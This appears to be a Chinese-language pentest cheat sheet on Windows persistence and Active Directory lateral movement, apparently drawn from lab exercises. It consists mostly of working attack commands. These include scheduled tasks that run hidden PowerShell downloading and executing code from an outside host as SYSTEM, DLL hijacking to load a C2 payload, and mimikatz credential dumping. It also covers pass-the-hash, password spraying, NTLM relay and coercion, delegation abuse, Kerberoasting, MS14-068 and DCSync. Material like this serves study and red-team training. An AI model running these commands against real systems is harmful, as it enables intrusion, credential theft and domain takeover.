<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#(X64) - On System Start</span></span><br><span class="line">schtasks /create /tn PentestLab /tr <span class="string">&quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://10.0.2.21:8080/ZPWLywg&#x27;&#x27;&#x27;))&#x27;&quot;</span> /sc onstart /ru System</span><br><span class="line"></span><br><span class="line"><span class="comment">#(X64) - On User Idle (30mins)</span></span><br><span class="line">schtasks /create /tn PentestLab /tr <span class="string">&quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://10.0.2.21:8080/ZPWLywg&#x27;&#x27;&#x27;))&#x27;&quot;</span> /sc onidle /i 30</span><br><span class="line"></span><br><span class="line"><span class="comment">#(X86) - On User Login</span></span><br><span class="line">schtasks /create /tn PentestLab /tr <span class="string">&quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://10.0.2.21:8080/ZPWLywg&#x27;&#x27;&#x27;))&#x27;&quot;</span> /sc onlogon /ru System</span><br><span class="line"></span><br><span class="line"><span class="comment">#(X86) - On System Start</span></span><br><span class="line">schtasks /create /tn PentestLab /tr <span class="string">&quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://10.0.2.21:8080/ZPWLywg&#x27;&#x27;&#x27;))&#x27;&quot;</span> /sc onstart /ru System</span><br><span class="line"></span><br><span class="line"><span class="comment">#(X86) - On User Idle (30mins)</span></span><br><span class="line">schtasks /create /tn PentestLab /tr <span class="string">&quot;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://10.0.2.21:8080/ZPWLywg&#x27;&#x27;&#x27;))&#x27;&quot;</span> /sc onidle /i 30</span><br></pre></td></tr></table></figure>
<h4 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h4><p>动态链接库 (DLL) 是一种在 Windows 操作系统中使用的文件格式，允许多个程序共享功能和资源。可以看成一个函数或者一个模块</p>
<p>Windows默认的dll调用顺序：</p>
<ol>
<li>程序所在⽬录。</li>
<li>加载 DLL 时所在的当前⽬录。</li>
<li>系统⽬录(C:\Windows\System32)</li>
<li>16位系统⽬录(C:\Windows\System)</li>
<li>Windows⽬录(C:\Windows)</li>
<li>PATH环境变量中列出的⽬录</li>
</ol>
<p>在win7及win7以上系统增加了KnownDLLs保护，他们将一些容易被劫持的DLL写进了注册表里，那么凡是此项下的DLL文件只能从SYSTEM32目录下调用，路径为 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code></p>
<p>使用流程：</p>
<ol>
<li>使用工具<strong>ProcessMonitor</strong>，找到要劫持的进程</li>
<li>使用工具<strong>AheadLib</strong>（管理员权限打开），输入目标dll的路径，选择直接转发函数，导出对应的CPP文件</li>
<li>用vs打开，在入口函数处添加cs生成的payload，打包生成新的dll文件</li>
<li>将原dll文件改名为之前在软件里面的名字文件放回去</li>
<li>最后运行目标程序，就会成功上线cs</li>
</ol>
<h2 id="域内横向"><a href="#域内横向" class="headerlink" title="域内横向"></a>域内横向</h2><h3 id="IPC-amp-at-amp-schticks-不常用"><a href="#IPC-amp-at-amp-schticks-不常用" class="headerlink" title="IPC$ &amp; at &amp; schticks(不常用)"></a>IPC$ &amp; at &amp; schticks(不常用)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\DELL&gt; net share</span><br><span class="line"></span><br><span class="line">Share name   Resource                        Remark</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line"><span class="meta">C$</span><span class="bash">           C:\                             默认共享</span></span><br><span class="line"><span class="meta">D$</span><span class="bash">           D:\                             默认共享</span></span><br><span class="line"><span class="meta">E$</span><span class="bash">           E:\                             默认共享</span></span><br><span class="line"><span class="meta">IPC$</span><span class="bash">                                         远程 IPC</span></span><br><span class="line"><span class="meta">print$</span><span class="bash">       C:\Windows\system32\spool\drivers</span></span><br><span class="line">                                             打印机驱动程序</span><br><span class="line"><span class="meta">ADMIN$</span><span class="bash">       C:\Windows                      远程管理</span></span><br></pre></td></tr></table></figure>
<p>实战中往往会建立<code>IPC$</code>连接，因为通过<code>IPC$</code>连接，不仅可以进行所有文件共享操作，还可以实现其他远程管理操作，如列出远程主机进程、在远程主机上创建计划任务或服务等。<br>使用前提：<br>远程主机开启了ipc连接，远程主机**139端口(NetBIOS协议)<strong>和</strong>445端口(SMB协议)**开放(依赖于系统配置和防火墙设置)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> IPC$ 连接</span></span><br><span class="line">net use \\192.168.52.138\ipc$                   # 建立空连接</span><br><span class="line">net use \\192.168.52.138\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;  # 建立非空连接</span><br><span class="line"><span class="meta">#</span><span class="bash"> IPC$ 连接建立之后的操作</span></span><br><span class="line">dir \\192.168.52.138\c$                             # 列出目标文件目录</span><br><span class="line">type \\192.168.52.138\c$\1.txt  #远程读取文件                                       </span><br></pre></td></tr></table></figure>
<h4 id="at-amp-schtasks-使用"><a href="#at-amp-schtasks-使用" class="headerlink" title="at &amp; schtasks 使用"></a>at &amp; schtasks 使用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.52.138 #查看目标系统的时间</span><br><span class="line">copy calc.bat \\192.168.52.138\c$ #将文件复制到远程主机的c盘</span><br><span class="line">at \\192.168.52.138 4:11pm c:\calc.bat #设置定时任务</span><br></pre></td></tr></table></figure>
<p>windows server2008以后的版本at命令已经被弃用了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">copy hack.bat \\192.168.52.138\c$</span><br><span class="line">schtasks /create /tn hack /tr C:\hack.bat /sc ONSTART /s 192.168.52.138 /ru &quot;system&quot; /u administrator /p Abc123456！ #创建了名为hack的计划任务，设置计划任务在系统启动时触发，指定以系统权限（Local System）运行该计划任务。如果没有建立ipc$需要/u/p</span><br><span class="line">schtasks /run /tn hack /s 192.168.52.138</span><br><span class="line">schtasks /delete /s 192.168.52.138 /u administrator /p Abc123456! /tn hack /f</span><br></pre></td></tr></table></figure>

<h3 id="NTLM-身份验证协议协议"><a href="#NTLM-身份验证协议协议" class="headerlink" title="NTLM 身份验证协议协议"></a>NTLM 身份验证协议协议</h3><p>早期SMB协议明文在网络上传输数据，后来诞生了LM验证机制，LM机制由于过于简单，微软提出了WindowsNT挑战/响应机制，这就是NTLM。远程桌面（3389）和文件共享（445）都使用的是ntlm进行认证<br>目前 NTLM 几个常见的使用场景：</p>
<pre><code>在域环境中用作 Kerberos 的备份，当Kerberos 失效时，就会使用 NTLM 进行认证。
使用本地账户登录时也会使用 NTLM 认证。
客户端尝试使用 ip 进行连接，而不是主机名时，也会使用 NTLM 进行认证。
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1423.1.png" alt="1423.1"></p>
<ol>
<li>**Application message(s)**：表示客户端和服务器之间发送的应用协议消息，并发送用户名、域名、机器名等相关信息</li>
<li><strong>NTLM_NEGOTIATE</strong>：client会向server发起请求连接协商，这个消息指定了该会话期望的安全特性。</li>
<li><strong>NTLM_CHALLENGE</strong>：server就会在本地生成一个（16位或8位）<strong>随机字符(Challenge)</strong>,并将Challenge传给client。</li>
<li><strong>NTLM_AUTHENTICATE</strong>：username的<strong>NTLM-hash</strong>对Challenge进行加密（加密过程中会利用到用户名、域名、机器名等相关信息），生成<strong>Response</strong>，并将Response发送给server</li>
<li>**Application message(s)**：server在收到Response后，将其和相同的方式进行加密生成另一个Response,如果相同，则验证成功，如果不同就失败</li>
</ol>
<p>NTLM在域登录的认证<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/NTLM%E5%9F%9F%E8%AE%A4%E8%AF%81.png" alt="NTLM域认证"></p>
<h4 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h4><p>根据上图，我们知道只要将截获的Net-NTLM Hash重放，就可以得到对应的TGT,从而实现对其他机器的控制<br>可以结合强制认证的方式获得Net-NTLM Hash实现横向移动(域控默认开启smb签名)</p>
<p>通过添加用户来验证 PeitiPotam 强制验证成功与否。<br><code>python3 ntlmrelayx.py -t ldaps://dc01.hack.lab --add-computer JustTest01$ --remove-mic</code></p>
<p>利用工具触发认证<br>使用 PeitiPotam 利用工具进行强制触发认证<br><code>python3 PetitPotam.py -d hack.lab -u spiderman -p 123.com 20.20.20.100 20.20.20.6</code></p>
<h3 id="windows-Kerberos身份认证协议"><a href="#windows-Kerberos身份认证协议" class="headerlink" title="windows Kerberos身份认证协议"></a>windows Kerberos身份认证协议</h3><p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1-1024x700.png" alt="1-1024x700"><br>krbtgt 用户，该用户是在创建域时系统自动创建的一个账号，其作用是密钥发行中心的服务账号，其密码是系统随机生成的，无法正常登陆主机。</p>
<p>SPN是服务器上所运行服务的唯一标示，每个使用Kerberos的服务都需要一个SPN，这样客户端才可以辨认这个服务。</p>
<p>可以把kerberos认证流程简要的分为三个部分：</p>
<h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>client向<strong>AS(Authentication Service)<strong>证明自己的身份的过程，目标是获取</strong>TGT(Ticket Granting Ticket)<strong>票据<br>请求包中包含：请求的用户名、客户端主机名、加密类型和</strong>Authenticator</strong>(用户NTLM hash加密的时间戳)以及一些其他信息。<br>AS会返回给Client一个<strong>Logon Session Key</strong>（请求用户client的NTLM hash对Session-key as进行加密）和<strong>krbtgt用户 hash加密的TGT票据</strong>(TGT里面包含PAC，PAC包含Client的域sid、Client所在的组)</p>
<h5 id="HASH传递（PTH）"><a href="#HASH传递（PTH）" class="headerlink" title="HASH传递（PTH）"></a>HASH传递（PTH）</h5><p>hash 传递的原理是在认证过程中，并不是直接使用用户的密码进行认证的，而是使用用户的hash值，因此，攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不需要提供明文密码(前提是得有相应的权限)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#运行mimikatz.exe</span></span><br><span class="line">privilege::debug  <span class="comment">#提升权限</span></span><br><span class="line">token::elevate <span class="comment">#将权限提升至system</span></span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords <span class="comment">#导出用户hash</span></span><br><span class="line">sekurlsa::pth /user:WIN2016$ /domain:XIAORANG /ntlm:adcd60560397bbaf2cd059dfe4676f77 <span class="comment">#获取后进行hash传递，登录域控</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用脚本连接</span></span><br><span class="line">proxychains impacket-wmiexec xiaorang.lab/Administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2</span><br><span class="line">proxychains python3 smbexec.py -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@172.22.3.26 -codec gbk</span><br><span class="line"></span><br><span class="line">proxychains crackmapexec smb 172.22.9.7 -u administrator -H2f1b57eefb2d152196836b0516abea80 -d xiaorang.lab -x <span class="string">&quot;type Users\Administrator\flag\flag04.txt&quot;</span></span><br></pre></td></tr></table></figure>


<h6 id="PTH-的限制-UAC"><a href="#PTH-的限制-UAC" class="headerlink" title="PTH 的限制 UAC"></a>PTH 的限制 UAC</h6><h5 id="域内用户枚举"><a href="#域内用户枚举" class="headerlink" title="域内用户枚举"></a>域内用户枚举</h5><p>在kerberos的AS-REQ认证中当cname值中的用户不存在时返回包提示<strong>KDC_ERR_C_PRINCIPAL_UNKNOWN</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_linux_386 userenum --dc 172.22.6.12 -d xiaorang.lab usersname.txt -t 10</span><br></pre></td></tr></table></figure>
<h5 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h5><p>当用户名存在，密码正确或者错误的时候，返回包也不一样，因此可以进行用户名密码爆破。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.4.45 -u Adrian -p rockyou.txt -d WIN19</span><br><span class="line"></span><br><span class="line">proxychains ./kerbrute_darwin_amd64 passwordspray --dc 172.22.9.7 -d xiaorang.lab ~/user.txt i9XDE02pLVf <span class="comment">#域内爆破</span></span><br><span class="line"></span><br><span class="line">proxychains4 hydra -L user.txt -P pass.txt 172.22.9.26 rdp &gt;&gt;result.txt <span class="comment">#hydra爆破rdp</span></span><br><span class="line">cat result.txt|| grep account</span><br></pre></td></tr></table></figure>

<h5 id="AS-REP-Roasting-不常用"><a href="#AS-REP-Roasting-不常用" class="headerlink" title="AS-REP Roasting(不常用)"></a>AS-REP Roasting(不常用)</h5><p>**关闭预身份验证后(默认是不关闭)**，在进行AS_REQ之后的时候，KDC不会进行任何验证就将TGT和用该用户Hash加密的Login Session Key返回，由于AS_REP的数据包中Login Session Key的是由用户Hash进行加密的，因此，可以对获取到的用户Hash加密的Login Session Key进行离线爆破，得到对应用户的明文密码</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute_darwin_amd64 userenum --dc 172.22.6.12 -d xiaorang.lab ~/users.txt -o output.txt <span class="comment">#枚举未设置预认证的账号</span></span><br><span class="line">hashcat -m 18200 1.txt -a 0 ./rockyou.txt  --force <span class="comment">#爆破密码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h5><p>(1):域名称<br>(2):域的SID（安全标识符,whoami /user可获取当前用户的sid,去掉最后的-四位后即为域sid）<br>(3):域的krbtgt账户密码HASH<br>(4):伪造用户名，可以是任意的</p>
<p>获取krbtgt的hash值，该值的方式有两种：</p>
<p>（1）控制了域控然后查询 <code>secretsdump.exe 域名/administrator:密码@IP</code></p>
<p>（2）通过dsync查询 <code>milikatz-&gt;lsadump::dcsync /domian:域名 /user:krbtgt</code></p>
<h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p><strong>TGS(Ticket Granting Service)<strong>通过client的TGT判断其是否有服务的访问权限，目标是获取</strong>ST(SEerver Ticket)</strong><br>返回一个用<strong>Login session key</strong>加密后的用于确保客户端服务器之间通讯安全的<strong>server-session -key</strong>，并且生成用<strong>Server_Hash</strong>加密的<strong>TGS票据(ST)</strong></p>
<h5 id="委托攻击"><a href="#委托攻击" class="headerlink" title="委托攻击"></a>委托攻击</h5><p><strong>主机hostB上的服务B</strong>需要<strong>代表用户A</strong>去访问<strong>hostC上的服务C</strong>，这个过程就被称为委派<br>查询域委派关系</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains findDelegation.py xiaorang.lab/Aldrich:<span class="string">&#x27;P@ssw0rd&#x27;</span> -dc-ip 172.22.8.15 -target-domain xiaorang.lab</span><br></pre></td></tr></table></figure>
<h6 id="非约束性委派-获取任意用户的TGT"><a href="#非约束性委派-获取任意用户的TGT" class="headerlink" title="非约束性委派(获取任意用户的TGT)"></a>非约束性委派(获取任意用户的TGT)</h6><p><strong>任何用户</strong>都可以委派主机hostB代替自己去访问<strong>任何服务</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#某个用户委托hostB去访问某个服务，那么这个用户会将 TGT发送到hostB并缓存到LSASS中，以方便以后使用,如果这个用户是域用户我们就可以获取他的TGT</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="string">&quot;exit&quot;</span> <span class="comment">#导出域管的TGT</span></span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptt [0;4bbb6]-2-0-60a10000-Administrator@krbtgt-HACKME.COM.kirbi&quot;</span> <span class="string">&quot;exit&quot;</span> <span class="comment">#通过 Pass The Ticket（PTT）将 TGT 注入到当前会话中,[0;4bbb6]-2-0-60a10000-Administrator@krbtgt-HACKME.COM.kirbi是对应的TGT文件</span></span><br></pre></td></tr></table></figure>
<p>如果上面没有目标的tgt，怎么让指定用户访问委派我们哪，可以使用<strong>NTLM Relay</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#上传Rubeus.exe 监听 TGT</span></span><br><span class="line">Rubeus.exe monitor /interval:1 /filteruser:DC01$</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用 DFSCoerce 漏洞利用工具，触发辅域控进行强制验证</span></span><br><span class="line">proxychains python3 dfscoerce.py -u win19$ -hashes <span class="string">&quot;aad3b435b51404eeaad3b435b51404ee:21b11500d5834a2b9b3373564a0565f6&quot;</span> -d xiaorang.lab win19 172.22.4.7</span><br><span class="line"></span><br><span class="line"><span class="comment">#导入 TGT 然后 DCSync</span></span><br><span class="line">Rubeus.exe ptt /ticket:xxx</span><br><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /all /csv&quot;</span></span><br></pre></td></tr></table></figure>

<h6 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h6><p>限制了访问的服务类型与资源主机，但是没有限制谁能对主机hostB进行委派</p>
<p>对于约束性委派，服务账号只能获取该用户的 ST 服务票据，从而只能模拟该用户访问特定的服务</p>
<p>如：假设我们拿到了配置了访问DC CIFS服务的约束性委派的域账号MSSQLSERVER$，现在我们尝试以Administrator的权限访问DC的CIFS服务。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;exit&quot;</span> <span class="comment"># 获取自身的hash</span></span><br><span class="line"></span><br><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:NTLM哈希 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap <span class="comment">#申请 可转发TS(S4U2self 协议允许服务代表任意用户请求访问自身服务的ST服务票据)，（需要提供可转发的TGT，自身的hash申请的）</span></span><br><span class="line"></span><br><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:你上面抓到的服务票据 <span class="comment">#使用上面获取S4U-TS伪造 Administrator 用户申请 ST(S4U2proxy 协议允许服务在已取得S4U-TS下代表任意用户获取其他指定服务的服务票据)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#可以看出只要控制配置约束性委派服务的机器，那么我们就可以获得任意用户权限的ticket</span></span><br></pre></td></tr></table></figure>

<h6 id="基于资源的约束性委派-RBCD"><a href="#基于资源的约束性委派-RBCD" class="headerlink" title="基于资源的约束性委派(RBCD)"></a>基于资源的约束性委派(RBCD)</h6><p>基于资源的约束委派允许资源配置受信任的帐户委派给他们。由资源本身为自己配置资源委派信任关系，资源本身决定可以信任谁。换个角度就是，资源和可以委派别人访问该资源的用户都被限制了</p>
<p>因为能够模拟其他用户的权限访问自己，所以资源的约束委派只能对自己进行攻击，也就是说提权操作或者权限维持</p>
<p>一般的情况是我们拿到一个域账户，其具备某台机器的属性修改的权限，那我们就可以获取这台主机的管理员权限</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用zhangxin域用户创建一个机器账户TEST2$(每个域用户默认可以创建10个)</span></span><br><span class="line">proxychains python3 addcomputer.py xiaorang.lab/zhangxin:<span class="string">&#x27;admin4qwY38cc&#x27;</span> -dc-ip 172.22.60.8 -dc-host xiaorang.lab -computer-name <span class="string">&#x27;TEST2$&#x27;</span> -computer-pass <span class="string">&#x27;P@ssw0rd&#x27;</span></span><br><span class="line"><span class="comment">#然后修改Fileserver$的msDS-AllowedToActOnBehalfOfOtherIdentity 为新创建的机器用户的sid</span></span><br><span class="line">proxychains python3 rbcd.py xiaorang.lab/zhangxin:<span class="string">&#x27;admin4qwY38cc&#x27;</span> -dc-ip 172.22.60.8 -action write -delegate-to <span class="string">&#x27;Fileserver$&#x27;</span> -delegate-from <span class="string">&#x27;TEST2$&#x27;</span></span><br><span class="line"><span class="comment">#利用该机器账户的凭证通过S4U协议伪造Administrator用户委派至目标主机的ST票据</span></span><br><span class="line">proxychains python3 getST.py xiaorang.lab/<span class="string">&#x27;TEST2$&#x27;</span>:<span class="string">&#x27;P@ssw0rd&#x27;</span> -spn cifs/Fileserver.xiaorang.lab -impersonate Administrator -dc-ip 172.22.60.8</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator.ccache <span class="comment">#导入申请的票据</span></span><br><span class="line">vim /etc/hosts <span class="comment">#改本地的/etc/hosts</span></span><br><span class="line">proxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk <span class="comment">#无密码连接</span></span><br></pre></td></tr></table></figure>

<h5 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h5><p>白银票据制作条件<br>(1):域名称<br>(2):域的SID<br>3.目标服务FQDN<br>4.服务名<br>(5):域控服务器账户的NTLM Hash(获取方法是可能域内某主机的hash和域控服务器的hash相同)<br>(6):伪造任意的用户名</p>
<p>伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用</p>
<h5 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h5><p>SPN（Service Principal Name）是Kerberos身份验证中用于标识特定服务实例（如HTTP、SMB、MySQL）的唯一名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联</p>
<p>SPN分为以下两种类型，一种为注册在活动目录的“机器账户computer”下，另一种为注册在活动目录的“域账号Users”下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setspn -Q */*                <span class="comment"># 查看当前域内所有的SPN</span></span><br><span class="line">setspn -T org.gm7 -Q */*    <span class="comment"># 指定域查询SPN</span></span><br><span class="line">setspn -L d4m1ts            <span class="comment"># 查找指定用户的SPN</span></span><br></pre></td></tr></table></figure>
<p>Kerberoasting简单来说就是<strong>暴破ST</strong>，因为ST是由服务的hash进行加密的，如果服务账号是域账号，就有可能破解域账号的密码；</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取ST票据</span></span><br><span class="line">Add-Type -AssemblyName System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="string">&quot;MSSQL2Svc/DESKTOP-9CAT508.org.gm7&quot;</span></span><br><span class="line"><span class="comment">#导出ST</span></span><br><span class="line">mimikatz <span class="string">&quot;kerberos::list /export&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line"><span class="comment">#暴破ST</span></span><br><span class="line">./tgsrepcrack.py password.txt 1-40a10000-d4m1ts@MSSQL2Svc\~DESKTOP-9CAT508.org.gm7-ORG.GM7.kirbi</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在Kerberos认证中，ST使用Service的NTML Hash。而域中所有主机都能通过查询SPN获取到服务对应的账户，所以我们可以对其进行爆破，这样就能获得其明文密码</p>
<h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p>client拿着ST票据与服务端进行通信，检测后允许访问该<strong>SPN(ServicePrincipal Names,服务主体名称)</strong></p>
<h5 id="PAC伪造—-MS14-068"><a href="#PAC伪造—-MS14-068" class="headerlink" title="PAC伪造—-MS14-068"></a>PAC伪造—-MS14-068</h5><p>在第一部分，TGT里面包含PAC，而PAC中包含用户的sid，用户所在的组。<br>在第二部分，KDC会验证TGT中的PAC的签名，判断PAC是否被篡改，如果PAC完好，则重新构造新的PAC放在TGS票据中，<br>在第三部分，服务会拿着PAC去KDC那边询问用户有没有访问权限，KDC解密PAC。</p>
<p>在<strong>小于2012R2且没有打KB3011780的域控</strong>中存在该漏洞，KDC会根据<strong>客户端指定</strong>PAC中数字签名的加密算法，来校验PAC的合法性。这使得攻击者可通过伪造PAC，修改PAC中的SID，导致KDC判断攻击者为高权限用户，从而导致权限提升漏洞的产生</p>
<p>需要有普通域用户的权限以及密码/hash值，以及用户的suid</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">systeminfo |find <span class="string">&quot;3011780&quot;</span> <span class="comment">#查看补丁</span></span><br><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</span><br><span class="line">MS14-068.exe -u douser@demo -s S-1-5-21-979886063-111190</span><br><span class="line">0045-1414766810-1107 -d 192.168.183.130 -p Dotest123</span><br><span class="line"><span class="comment">#这里获取到一个TGT_douser@demo.com.ccache文件</span></span><br><span class="line">kerberos::purge <span class="comment">#清空已有TGT票据</span></span><br><span class="line">kerberos::list  <span class="comment">#查看TGT票据</span></span><br><span class="line"><span class="comment">#注入伪造的票据</span></span><br><span class="line">kerberos::ptc TGT_douser@demo.com.ccache</span><br></pre></td></tr></table></figure>




<h3 id="DCsync攻击获取域内用户hash"><a href="#DCsync攻击获取域内用户hash" class="headerlink" title="DCsync攻击获取域内用户hash"></a>DCsync攻击获取域内用户hash</h3><p>DCSync是AD域渗透中常用的凭据窃取手段，默认情况下，域内不同DC每隔15分钟会进行一次数据同步，当一个DC从另外一个DC同步数据时，发起请求的一方会通过目录复制协议（MS- DRSR）来对另外一台域控中的域用户密码进行复制，DCSync就是利用这个原理，“模拟”DC向真实DC发送数据同步请求，获取用户凭据数据</p>
<p>默认以下用户存在该权限</p>
<pre><code>DC本地Administrators组内的用户
Domain Admins组内的用户
Enterprise Admins组内的用户    企业管理员
域控的机器帐户
</code></pre>
<p>默认只有<strong>域控的机器用户</strong>和<strong>域管理员</strong>能DCSYNC</p>
